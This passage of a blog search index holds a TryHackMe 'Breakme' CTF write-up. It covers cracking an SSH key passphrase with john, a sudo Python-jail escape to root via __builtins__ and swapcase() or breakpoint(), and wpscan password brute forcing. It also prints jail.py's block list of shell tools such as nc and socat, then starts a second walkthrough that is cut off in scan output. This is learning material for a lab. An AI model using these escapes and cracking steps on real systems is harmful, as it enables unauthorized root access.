0LBpVwh96JbHrLASEwx74+CQq71ICdX3Qvv0cJFjMBUmLgFCyaoKlNKntBqHEJ2bI4+qHq W5lj7CKPS8r6xN83bz8pWg44bbJaspWajXqgDM0Pb4/ANBgMoxLgAmQUgSLfDOg6FCXGlU rkYkHSce+BnIEYBnNK9ttPGRMdElELGBTfBXpBtYoF+9hXOnTD2pVDVewpV7kOqBiusnfM yHBxN27qpNoUHbrKHxLx4/UN4z3xcaabtC7BelMsu4RQ3rzGtLS9fhT5e0hoMP+eU3IvMB g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT TabCXd2Ji/Y7UvM= -----END OPENSSH PRIVATE KEY----- We got the id_rsa ssh key of user youcef. When tried to connect network as user youcef, system requesting for password. We need to crack the password of id_rsa key.\nssh2john ssh2john id_rsa \u0026gt; id_rsa_hash Getting the decryption hash using ssh2john.\njohn id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt a123456 (id_rsa) Now we got the password for id_rsa key.\nyoucef@Breakme:~$ cat /home/youcef/.ssh/user2.txt flag2 REDACTED We got our second flag here.\nShell as root youcef@Breakme:~$ id uid=1000(youcef) gid=1000(youcef) groups=1000(youcef) youcef@Breakme:~$ sudo -l Matching Defaults entries for youcef on breakme: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User youcef may run the following commands on breakme: (root) NOPASSWD: /usr/bin/python3 /root/jail.py We can run /usr/bin/python3 /root/jail.py in the context of root user.\nyoucef@Breakme:~$ sudo /usr/bin/python3 /root/jail.py Welcome to Python jail Will you stay locked forever Or will you BreakMe \u0026gt;\u0026gt; eval Illegal Input \u0026gt;\u0026gt; exec Illegal Input \u0026gt;\u0026gt; test string #Error due to space Illegal Input \u0026gt;\u0026gt; import Illegal Input \u0026gt;\u0026gt; hello Wrong Input \u0026gt;\u0026gt; print(\u0026#39;hello\u0026#39;) hello \u0026gt;\u0026gt; bash Illegal Input \u0026gt;\u0026gt; BASH Wrong Input Seems like the code is filtering certain functions like eval, exec, \u0026lt;SPACE\u0026gt;, etc,. and UNIX commands like bash.\nPython JailBreak Resources to read: escaping-python-jails | Aneesh Dogra , builtins|Python , Builtins|Hacktricks , python-ctf-cheatsheet/pyjails ,pyjail-cheatsheet#unicode-bypass , Intalic text Generator .\n\u0026gt;\u0026gt; print(__builtins__) \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt; \u0026gt;\u0026gt; print(dir(__builtins__)) [\u0026#39;ArithmeticError\u0026#39;, \u0026#39;AssertionError\u0026#39;, \u0026#39;AttributeError\u0026#39;, \u0026#39;BaseException\u0026#39;, \u0026#39;BlockingIOError\u0026#39;, \u0026#39;BrokenPipeError\u0026#39;, \u0026#39;BufferError\u0026#39;, \u0026#39;BytesWarning\u0026#39;, \u0026#39;ChildProcessError\u0026#39;, \u0026#39;ConnectionAbortedError\u0026#39;, \u0026#39;ConnectionError\u0026#39;, \u0026#39;ConnectionRefusedError\u0026#39;, \u0026#39;ConnectionResetError\u0026#39;, \u0026#39;DeprecationWarning\u0026#39;, \u0026#39;EOFError\u0026#39;, \u0026#39;Ellipsis\u0026#39;, \u0026#39;EnvironmentError\u0026#39;, \u0026#39;Exception\u0026#39;, \u0026#39;False\u0026#39;, \u0026#39;FileExistsError\u0026#39;, \u0026#39;FileNotFoundError\u0026#39;, \u0026#39;FloatingPointError\u0026#39;, \u0026#39;FutureWarning\u0026#39;, \u0026#39;GeneratorExit\u0026#39;, \u0026#39;IOError\u0026#39;, \u0026#39;ImportError\u0026#39;, \u0026#39;ImportWarning\u0026#39;, \u0026#39;IndentationError\u0026#39;, \u0026#39;IndexError\u0026#39;, \u0026#39;InterruptedError\u0026#39;, \u0026#39;IsADirectoryError\u0026#39;, \u0026#39;KeyError\u0026#39;, \u0026#39;KeyboardInterrupt\u0026#39;, \u0026#39;LookupError\u0026#39;, \u0026#39;MemoryError\u0026#39;, \u0026#39;ModuleNotFoundError\u0026#39;, \u0026#39;NameError\u0026#39;, \u0026#39;None\u0026#39;, \u0026#39;NotADirectoryError\u0026#39;, \u0026#39;NotImplemented\u0026#39;, \u0026#39;NotImplementedError\u0026#39;, \u0026#39;OSError\u0026#39;, \u0026#39;OverflowError\u0026#39;, \u0026#39;PendingDeprecationWarning\u0026#39;, \u0026#39;PermissionError\u0026#39;, \u0026#39;ProcessLookupError\u0026#39;, \u0026#39;RecursionError\u0026#39;, \u0026#39;ReferenceError\u0026#39;, \u0026#39;ResourceWarning\u0026#39;, \u0026#39;RuntimeError\u0026#39;, \u0026#39;RuntimeWarning\u0026#39;, \u0026#39;StopAsyncIteration\u0026#39;, \u0026#39;StopIteration\u0026#39;, \u0026#39;SyntaxError\u0026#39;, \u0026#39;SyntaxWarning\u0026#39;, \u0026#39;SystemError\u0026#39;, \u0026#39;SystemExit\u0026#39;, \u0026#39;TabError\u0026#39;, \u0026#39;TimeoutError\u0026#39;, \u0026#39;True\u0026#39;, \u0026#39;TypeError\u0026#39;, \u0026#39;UnboundLocalError\u0026#39;, \u0026#39;UnicodeDecodeError\u0026#39;, \u0026#39;UnicodeEncodeError\u0026#39;, \u0026#39;UnicodeError\u0026#39;, \u0026#39;UnicodeTranslateError\u0026#39;, \u0026#39;UnicodeWarning\u0026#39;, \u0026#39;UserWarning\u0026#39;, \u0026#39;ValueError\u0026#39;, \u0026#39;Warning\u0026#39;, \u0026#39;ZeroDivisionError\u0026#39;, \u0026#39;__build_class__\u0026#39;, \u0026#39;__debug__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__import__\u0026#39;, \u0026#39;__loader__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__package__\u0026#39;, \u0026#39;__spec__\u0026#39;, \u0026#39;abs\u0026#39;, \u0026#39;all\u0026#39;, \u0026#39;any\u0026#39;, \u0026#39;ascii\u0026#39;, \u0026#39;bin\u0026#39;, \u0026#39;bool\u0026#39;, \u0026#39;breakpoint\u0026#39;, \u0026#39;bytearray\u0026#39;, \u0026#39;bytes\u0026#39;, \u0026#39;callable\u0026#39;, \u0026#39;chr\u0026#39;, \u0026#39;classmethod\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;complex\u0026#39;, \u0026#39;copyright\u0026#39;, \u0026#39;credits\u0026#39;, \u0026#39;delattr\u0026#39;, \u0026#39;dict\u0026#39;, \u0026#39;dir\u0026#39;, \u0026#39;divmod\u0026#39;, \u0026#39;enumerate\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;exit\u0026#39;, \u0026#39;filter\u0026#39;, \u0026#39;float\u0026#39;, \u0026#39;format\u0026#39;, \u0026#39;frozenset\u0026#39;, \u0026#39;getattr\u0026#39;, \u0026#39;globals\u0026#39;, \u0026#39;hasattr\u0026#39;, \u0026#39;hash\u0026#39;, \u0026#39;help\u0026#39;, \u0026#39;hex\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;input\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;isinstance\u0026#39;, \u0026#39;issubclass\u0026#39;, \u0026#39;iter\u0026#39;, \u0026#39;len\u0026#39;, \u0026#39;license\u0026#39;, \u0026#39;list\u0026#39;, \u0026#39;locals\u0026#39;, \u0026#39;map\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;memoryview\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;next\u0026#39;, \u0026#39;object\u0026#39;, \u0026#39;oct\u0026#39;, \u0026#39;open\u0026#39;, \u0026#39;ord\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;print\u0026#39;, \u0026#39;property\u0026#39;, \u0026#39;quit\u0026#39;, \u0026#39;range\u0026#39;, \u0026#39;repr\u0026#39;, \u0026#39;reversed\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;set\u0026#39;, \u0026#39;setattr\u0026#39;, \u0026#39;slice\u0026#39;, \u0026#39;sorted\u0026#39;, \u0026#39;staticmethod\u0026#39;, \u0026#39;str\u0026#39;, \u0026#39;sum\u0026#39;, \u0026#39;super\u0026#39;, \u0026#39;tuple\u0026#39;, \u0026#39;type\u0026#39;, \u0026#39;vars\u0026#39;, \u0026#39;zip\u0026#39;] \u0026gt;\u0026gt; print(dir(__builtins__.__dict__)) [\u0026#39;__class__\u0026#39;, \u0026#39;__class_getitem__\u0026#39;, \u0026#39;__contains__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__delitem__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__getitem__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__ior__\u0026#39;, \u0026#39;__iter__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__len__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__or__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__reversed__\u0026#39;, \u0026#39;__ror__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__setitem__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;clear\u0026#39;, \u0026#39;copy\u0026#39;, \u0026#39;fromkeys\u0026#39;, \u0026#39;get\u0026#39;, \u0026#39;items\u0026#39;, \u0026#39;keys\u0026#39;, \u0026#39;pop\u0026#39;, \u0026#39;popitem\u0026#39;, \u0026#39;setdefault\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;values\u0026#39;]0 __builtins__ working fine for us, lets investigate how to use this further.\n__builtins__.__dict__[\u0026#39;__IMPORT__\u0026#39;.lower()](\u0026#39;OS\u0026#39;.lower()).__dict__[\u0026#39;SYSTEM\u0026#39;.lower()](\u0026#39;ls\u0026#39;) We can use the above command to list the files in root directory.\n\u0026gt;\u0026gt; __builtins__.__dict__[\u0026#39;__IMPORT__\u0026#39;.lower()](\u0026#39;OS\u0026#39;.lower()).__dict__[\u0026#39;SYSTEM\u0026#39;.lower()](\u0026#39;ls\u0026#39;) Illegal Input \u0026gt;\u0026gt; __IMPORT__ Wrong Input \u0026gt;\u0026gt; lower Illegal Input So, the error is from the lower. Lets use some other method to change its CASE.\n\u0026gt;\u0026gt; __builtins__.__dict__[\u0026#39;__IMPORT__\u0026#39;.swapcase()](\u0026#39;OS\u0026#39;.swapcase()).__dict__[\u0026#39;SYSTEM\u0026#39;.swapcase()](\u0026#39;ls\u0026#39;) readfile readfile.c \u0026gt;\u0026gt; __builtins__.__dict__[\u0026#39;__IMPORT__\u0026#39;.swapcase()](\u0026#39;OS\u0026#39;.swapcase()).__dict__[\u0026#39;SYSTEM\u0026#39;.swapcase()](\u0026#39;id\u0026#39;) uid=0(root) gid=0(root) groups=0(root) By changing .lower() to .swapcase() we are able to execute the command as root user.\n__builtins__.__dict__[\u0026#39;__IMPORT__\u0026#39;.swapcase()](\u0026#39;OS\u0026#39;.swapcase()).__dict__[\u0026#39;SYSTEM\u0026#39;.swapcase()](\u0026#39;BASH\u0026#39;.swapcase()) We got the shell as root user here.\ncat /root/.root.txt flag3 REDACTED We got our last flag here.\nAlternatives Username and Password enumaration using wpscan wpscan --url http://10.10.158.39/wordpress -e u --passwords /usr/share/wordlists/rockyou.txt Python JailBreak using 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() Need to run the above command in python jail. Now calling import os;os.system(\u0026quot;/bin/sh\u0026quot;) will gives us a shell as root user.\nThe source suggested a potential solution to escape Python jails: using the breakpoint() function. This built-in Python function, introduced in Python 3.7, allows developers to pause the execution of their code and enter an interactive debugging session. In the context of Python jail escapes, where the goal is to break out of restricted Python environments, breakpoint() could be used to gain access to the sandbox\u0026rsquo;s internals, file system, or sensitive variables through interactive debugging. Read also : pyjails#no-ascii-letters , Unicode-related Security Considerations for Python and Intalic text Generator .\nExtras jail.py # jail.py import os def malicious(): print(\u0026#34;Illegal Input\u0026#34;) def main(): while(True): try: text = input(\u0026#39;\u0026gt;\u0026gt; \u0026#39;) except: print(\u0026#34;Exiting...\u0026#34;) return for keyword in [\u0026#39;#\u0026#39;,\u0026#39; \u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;\u0026#34;\u0026#39;,\u0026#39;class\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;breakpoint\u0026#39;,\u0026#39;eval\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;import\u0026#39;, \u0026#39;open\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;read\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;write\u0026#39;, \u0026#39;lower\u0026#39;,\u0026#39;class\u0026#39;,\u0026#39;init\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;‘\u0026#39;,\u0026#39;readlines\u0026#39;,\u0026#39;bash\u0026#39;,\u0026#39;sh\u0026#39;,\u0026#39;7z\u0026#39;, \u0026#39;aa-exec\u0026#39;, \u0026#39;ab\u0026#39;, \u0026#39;agetty\u0026#39;, \u0026#39;alpine\u0026#39;, \u0026#39;ansible-playbook\u0026#39;, \u0026#39;ansible-test\u0026#39;, \u0026#39;aoss\u0026#39;, \u0026#39;apt-get\u0026#39;, \u0026#39;apt\u0026#39;, \u0026#39;ar\u0026#39;, \u0026#39;aria2c\u0026#39;, \u0026#39;arj\u0026#39;, \u0026#39;arp\u0026#39;, \u0026#39;ascii-xfr\u0026#39;, \u0026#39;ascii85\u0026#39;, \u0026#39;ash\u0026#39;, \u0026#39;aspell\u0026#39;, \u0026#39;at\u0026#39;, \u0026#39;atobm\u0026#39;, \u0026#39;awk\u0026#39;, \u0026#39;aws\u0026#39;, \u0026#39;base32\u0026#39;, \u0026#39;base58\u0026#39;, \u0026#39;base64\u0026#39;, \u0026#39;basenc\u0026#39;, \u0026#39;basez\u0026#39;, \u0026#39;bash\u0026#39;, \u0026#39;batcat\u0026#39;, \u0026#39;bc\u0026#39;, \u0026#39;bconsole\u0026#39;, \u0026#39;bpftrace\u0026#39;, \u0026#39;bridge\u0026#39;, \u0026#39;bundle\u0026#39;, \u0026#39;bundler\u0026#39;, \u0026#39;busctl\u0026#39;, \u0026#39;busybox\u0026#39;, \u0026#39;byebug\u0026#39;, \u0026#39;bzip2\u0026#39;, \u0026#39;c89\u0026#39;, \u0026#39;c99\u0026#39;, \u0026#39;cabal\u0026#39;, \u0026#39;cancel\u0026#39;, \u0026#39;capsh\u0026#39;, \u0026#39;cat\u0026#39;, \u0026#39;cdist\u0026#39;, \u0026#39;certbot\u0026#39;, \u0026#39;check_by_ssh\u0026#39;, \u0026#39;check_cups\u0026#39;, \u0026#39;check_log\u0026#39;, \u0026#39;check_memory\u0026#39;, \u0026#39;check_raid\u0026#39;, \u0026#39;check_ssl_cert\u0026#39;, \u0026#39;check_statusfile\u0026#39;, \u0026#39;chmod\u0026#39;, \u0026#39;choom\u0026#39;, \u0026#39;chown\u0026#39;, \u0026#39;chroot\u0026#39;, \u0026#39;cmp\u0026#39;, \u0026#39;cobc\u0026#39;, \u0026#39;column\u0026#39;, \u0026#39;comm\u0026#39;, \u0026#39;composer\u0026#39;, \u0026#39;cowsay\u0026#39;, \u0026#39;cowthink\u0026#39;, \u0026#39;cp\u0026#39;, \u0026#39;cpan\u0026#39;, \u0026#39;cpio\u0026#39;, \u0026#39;cpulimit\u0026#39;, \u0026#39;crash\u0026#39;, \u0026#39;crontab\u0026#39;, \u0026#39;csh\u0026#39;, \u0026#39;csplit\u0026#39;, \u0026#39;csvtool\u0026#39;, \u0026#39;cupsfilter\u0026#39;, \u0026#39;curl\u0026#39;, \u0026#39;cut\u0026#39;, \u0026#39;dash\u0026#39;, \u0026#39;date\u0026#39;, \u0026#39;dd\u0026#39;, \u0026#39;debugfs\u0026#39;, \u0026#39;dialog\u0026#39;, \u0026#39;diff\u0026#39;, \u0026#39;dig\u0026#39;, \u0026#39;distcc\u0026#39;, \u0026#39;dmesg\u0026#39;, \u0026#39;dmidecode\u0026#39;, \u0026#39;dmsetup\u0026#39;, \u0026#39;dnf\u0026#39;, \u0026#39;docker\u0026#39;, \u0026#39;dos2unix\u0026#39;, \u0026#39;dosbox\u0026#39;, \u0026#39;dotnet\u0026#39;, \u0026#39;dpkg\u0026#39;, \u0026#39;dstat\u0026#39;, \u0026#39;dvips\u0026#39;, \u0026#39;easy_install\u0026#39;, \u0026#39;eb\u0026#39;, \u0026#39;ed\u0026#39;, \u0026#39;efax\u0026#39;, \u0026#39;elvish\u0026#39;, \u0026#39;emacs\u0026#39;, \u0026#39;env\u0026#39;, \u0026#39;eqn\u0026#39;, \u0026#39;espeak\u0026#39;, \u0026#39;exiftool\u0026#39;, \u0026#39;expand\u0026#39;, \u0026#39;expect\u0026#39;, \u0026#39;facter\u0026#39;, \u0026#39;find\u0026#39;, \u0026#39;finger\u0026#39;, \u0026#39;fish\u0026#39;, \u0026#39;flock\u0026#39;, \u0026#39;fmt\u0026#39;, \u0026#39;fping\u0026#39;, \u0026#39;ftp\u0026#39;, \u0026#39;gawk\u0026#39;, \u0026#39;gcc\u0026#39;, \u0026#39;gcloud\u0026#39;, \u0026#39;gcore\u0026#39;, \u0026#39;gdb\u0026#39;, \u0026#39;gem\u0026#39;, \u0026#39;genie\u0026#39;, \u0026#39;genisoimage\u0026#39;, \u0026#39;ghc\u0026#39;, \u0026#39;ghci\u0026#39;, \u0026#39;gimp\u0026#39;, \u0026#39;ginsh\u0026#39;, \u0026#39;git\u0026#39;, \u0026#39;grc\u0026#39;, \u0026#39;grep\u0026#39;, \u0026#39;gtester\u0026#39;, \u0026#39;gzip\u0026#39;, \u0026#39;hd\u0026#39;, \u0026#39;head\u0026#39;, \u0026#39;hexdump\u0026#39;, \u0026#39;highlight\u0026#39;, \u0026#39;hping3\u0026#39;, \u0026#39;iconv\u0026#39;, \u0026#39;iftop\u0026#39;, \u0026#39;install\u0026#39;, \u0026#39;ionice\u0026#39;, \u0026#39;ip\u0026#39;, \u0026#39;irb\u0026#39;, \u0026#39;ispell\u0026#39;, \u0026#39;jjs\u0026#39;, \u0026#39;joe\u0026#39;, \u0026#39;join\u0026#39;, \u0026#39;journalctl\u0026#39;, \u0026#39;jq\u0026#39;, \u0026#39;jrunscript\u0026#39;, \u0026#39;jtag\u0026#39;, \u0026#39;julia\u0026#39;, \u0026#39;knife\u0026#39;, \u0026#39;ksh\u0026#39;, \u0026#39;ksshell\u0026#39;, \u0026#39;ksu\u0026#39;, \u0026#39;kubectl\u0026#39;, \u0026#39;latex\u0026#39;, \u0026#39;latexmk\u0026#39;,\u0026#39;ld.so\u0026#39;, \u0026#39;ldconfig\u0026#39;, \u0026#39;less\u0026#39;, \u0026#39;lftp\u0026#39;, \u0026#39;ln\u0026#39;, \u0026#39;loginctl\u0026#39;, \u0026#39;logsave\u0026#39;, \u0026#39;look\u0026#39;, \u0026#39;lp\u0026#39;, \u0026#39;ltrace\u0026#39;, \u0026#39;lua\u0026#39;, \u0026#39;lualatex\u0026#39;, \u0026#39;luatex\u0026#39;, \u0026#39;lwp-\u0026#39;, \u0026#39;lwp-request\u0026#39;, \u0026#39;mail\u0026#39;, \u0026#39;make\u0026#39;, \u0026#39;man\u0026#39;, \u0026#39;mawk\u0026#39;, \u0026#39;more\u0026#39;, \u0026#39;mosquitto\u0026#39;, \u0026#39;mount\u0026#39;, \u0026#39;msfconsole\u0026#39;, \u0026#39;msgattrib\u0026#39;, \u0026#39;msgcat\u0026#39;, \u0026#39;msgconv\u0026#39;, \u0026#39;msgfilter\u0026#39;, \u0026#39;msgmerge\u0026#39;, \u0026#39;msguniq\u0026#39;, \u0026#39;mtr\u0026#39;, \u0026#39;multitime\u0026#39;, \u0026#39;mv\u0026#39;, \u0026#39;mysql\u0026#39;, \u0026#39;nano\u0026#39;, \u0026#39;nasm\u0026#39;, \u0026#39;nawk\u0026#39;, \u0026#39;nc\u0026#39;, \u0026#39;ncftp\u0026#39;, \u0026#39;neofetch\u0026#39;, \u0026#39;nft\u0026#39;, \u0026#39;nice\u0026#39;, \u0026#39;nl\u0026#39;, \u0026#39;nm\u0026#39;, \u0026#39;nmap\u0026#39;, \u0026#39;node\u0026#39;, \u0026#39;nohup\u0026#39;, \u0026#39;npm\u0026#39;, \u0026#39;nroff\u0026#39;, \u0026#39;nsenter\u0026#39;, \u0026#39;octave\u0026#39;, \u0026#39;od\u0026#39;, \u0026#39;openssl\u0026#39;, \u0026#39;openvpn\u0026#39;, \u0026#39;openvt\u0026#39;, \u0026#39;opkg\u0026#39;, \u0026#39;pandoc\u0026#39;, \u0026#39;paste\u0026#39;, \u0026#39;pax\u0026#39;, \u0026#39;pdb\u0026#39;, \u0026#39;pdflatex\u0026#39;, \u0026#39;pdftex\u0026#39;, \u0026#39;perf\u0026#39;, \u0026#39;perl\u0026#39;, \u0026#39;perlbug\u0026#39;, \u0026#39;pexec\u0026#39;, \u0026#39;pg\u0026#39;, \u0026#39;php\u0026#39;, \u0026#39;pic\u0026#39;, \u0026#39;pico\u0026#39;, \u0026#39;pidstat\u0026#39;, \u0026#39;pip\u0026#39;, \u0026#39;pkexec\u0026#39;, \u0026#39;pkg\u0026#39;, \u0026#39;posh\u0026#39;,\u0026#39;pry\u0026#39;, \u0026#39;psftp\u0026#39;, \u0026#39;psql\u0026#39;, \u0026#39;ptx\u0026#39;, \u0026#39;puppet\u0026#39;, \u0026#39;pwsh\u0026#39;, \u0026#39;python\u0026#39;, \u0026#39;rake\u0026#39;, \u0026#39;rc\u0026#39;, \u0026#39;readelf\u0026#39;, \u0026#39;red\u0026#39;, \u0026#39;redcarpet\u0026#39;, \u0026#39;redis\u0026#39;, \u0026#39;restic\u0026#39;, \u0026#39;rev\u0026#39;, \u0026#39;rlogin\u0026#39;, \u0026#39;rlwrap\u0026#39;, \u0026#39;rpm\u0026#39;, \u0026#39;rpmdb\u0026#39;, \u0026#39;rpmquery\u0026#39;, \u0026#39;rpmverify\u0026#39;, \u0026#39;rsync\u0026#39;, \u0026#39;rtorrent\u0026#39;, \u0026#39;ruby\u0026#39;, \u0026#39;run-mailcap\u0026#39;, \u0026#39;run-parts\u0026#39;, \u0026#39;rview\u0026#39;, \u0026#39;rvim\u0026#39;, \u0026#39;sash\u0026#39;, \u0026#39;scanmem\u0026#39;, \u0026#39;scp\u0026#39;, \u0026#39;screen\u0026#39;, \u0026#39;script\u0026#39;, \u0026#39;scrot\u0026#39;, \u0026#39;sed\u0026#39;, \u0026#39;service\u0026#39;, \u0026#39;setarch\u0026#39;, \u0026#39;setfacl\u0026#39;, \u0026#39;setlock\u0026#39;, \u0026#39;sftp\u0026#39;, \u0026#39;sg\u0026#39;, \u0026#39;shuf\u0026#39;, \u0026#39;slsh\u0026#39;, \u0026#39;smbclient\u0026#39;, \u0026#39;snap\u0026#39;, \u0026#39;socat\u0026#39;, \u0026#39;socket\u0026#39;, \u0026#39;soelim\u0026#39;, \u0026#39;softlimit\u0026#39;, \u0026#39;sort\u0026#39;, \u0026#39;split\u0026#39;, \u0026#39;sqlite3\u0026#39;, \u0026#39;sqlmap\u0026#39;, \u0026#39;ss\u0026#39;, \u0026#39;ssh-agent\u0026#39;, \u0026#39;ssh-keygen\u0026#39;, \u0026#39;ssh-keyscan\u0026#39;, \u0026#39;ssh\u0026#39;, \u0026#39;sshpass\u0026#39;, \u0026#39;start-stop-daemon\u0026#39;, \u0026#39;stdbuf\u0026#39;, \u0026#39;strace\u0026#39;, \u0026#39;strings\u0026#39;, \u0026#39;su\u0026#39;, \u0026#39;sysctl\u0026#39;, \u0026#39;systemctl\u0026#39;, \u0026#39;systemd-resolve\u0026#39;, \u0026#39;tac\u0026#39;, \u0026#39;tail\u0026#39;, \u0026#39;tar\u0026#39;, \u0026#39;task\u0026#39;, \u0026#39;taskset\u0026#39;, \u0026#39;tasksh\u0026#39;, \u0026#39;tbl\u0026#39;, \u0026#39;tclsh\u0026#39;, \u0026#39;tcpdump\u0026#39;, \u0026#39;tdbtool\u0026#39;, \u0026#39;tee\u0026#39;, \u0026#39;telnet\u0026#39;, \u0026#39;tex\u0026#39;, \u0026#39;tftp\u0026#39;, \u0026#39;tic\u0026#39;, \u0026#39;time\u0026#39;, \u0026#39;timedatectl\u0026#39;, \u0026#39;timeout\u0026#39;, \u0026#39;tmate\u0026#39;, \u0026#39;tmux\u0026#39;, \u0026#39;top\u0026#39;, \u0026#39;torify\u0026#39;, \u0026#39;torsocks\u0026#39;, \u0026#39;troff\u0026#39;, \u0026#39;tshark\u0026#39;, \u0026#39;ul\u0026#39;, \u0026#39;unexpand\u0026#39;, \u0026#39;uniq\u0026#39;, \u0026#39;unshare\u0026#39;, \u0026#39;unzip\u0026#39;, \u0026#39;update-alternatives\u0026#39;, \u0026#39;uudecode\u0026#39;, \u0026#39;uuencode\u0026#39;, \u0026#39;vagrant\u0026#39;, \u0026#39;valgrind\u0026#39;, \u0026#39;vi\u0026#39;, \u0026#39;view\u0026#39;, \u0026#39;vigr\u0026#39;, \u0026#39;vim\u0026#39;, \u0026#39;vimdiff\u0026#39;, \u0026#39;vipw\u0026#39;, \u0026#39;virsh\u0026#39;, \u0026#39;volatility\u0026#39;, \u0026#39;w3m\u0026#39;, \u0026#39;wall\u0026#39;, \u0026#39;watch\u0026#39;, \u0026#39;wc\u0026#39;, \u0026#39;wget\u0026#39;, \u0026#39;whiptail\u0026#39;, \u0026#39;whois\u0026#39;, \u0026#39;wireshark\u0026#39;, \u0026#39;wish\u0026#39;, \u0026#39;xargs\u0026#39;, \u0026#39;xdotool\u0026#39;, \u0026#39;xelatex\u0026#39;, \u0026#39;xetex\u0026#39;, \u0026#39;xmodmap\u0026#39;, \u0026#39;xmore\u0026#39;, \u0026#39;xpad\u0026#39;, \u0026#39;xxd\u0026#39;, \u0026#39;xz\u0026#39;, \u0026#39;yarn\u0026#39;, \u0026#39;yash\u0026#39;, \u0026#39;yelp\u0026#39;, \u0026#39;yum\u0026#39;, \u0026#39;zathura\u0026#39;, \u0026#39;zip\u0026#39;, \u0026#39;zsh\u0026#39;, \u0026#39;zsoelim\u0026#39;, \u0026#39;zypper\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;$\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026lt;\u0026#39;]: if keyword in text: malicious() return try: if \u0026#34;__builtins__.__dict__[\u0026#39;__IMPORT__\u0026#39;.casefold()](\u0026#39;OS\u0026#39;.casefold()).__dict__[\u0026#39;SYSTEM\u0026#39;.casefold()](\u0026#39;\u0026#34; in text: if len(text)!=119 or os.path.islink(text[95:-2]): malicious() return else: if(text[95:-2]!=\u0026#34;/lib/yorick/bin/yorick\u0026#34;): malicious() return else: exec(text) else: exec(text) except SyntaxError: print(\u0026#34;Wrong Input\u0026#34;) except NameError: print(\u0026#34;Wrong Input\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34; Welcome to Python jail \u0026#34;) print(\u0026#34; Will you stay locked forever \u0026#34;) print(\u0026#34; Or will you BreakMe \u0026#34;) main() The above code is the actual content of jail.py in the target system.\nWe solved the lab.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/breakme/writeup/","tags":["rustscan","ffuf","wpscan","curl","hydra","CVE-2023-1874","pspy","Chisel","tunneling","SpecialCharacterBypass","${IFS}","RaceCondition","PythonJailBreak","𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()"],"title":"Breakme | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs for CERTain Doom CTF challenges on TryHackMe .\n$ echo \u0026#34;10.10.81.254 certain-doom.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain certain-doom.thm.\nQuestions 1. What is the web flag? Hint:Today\u0026#39;s lucky number is 11 2. What is the user\u0026#39;s flag? 3. What is the super secret flag? Hint: supersonic subatomic Initial Foothold Rustscan $ rustscan -a certain-doom.thm -- -sV -sC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; Open 10.10.81.254:22 Open 10.10.81.254:80 Open 10.10.81.254:8080 [~] Starting Script(s) Scanned at 2024-09-14 08:29:53 IST for 157s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 f0:69:84:5c:69:01:42:2d:da:01:3e:13:a6:db:2f:c3 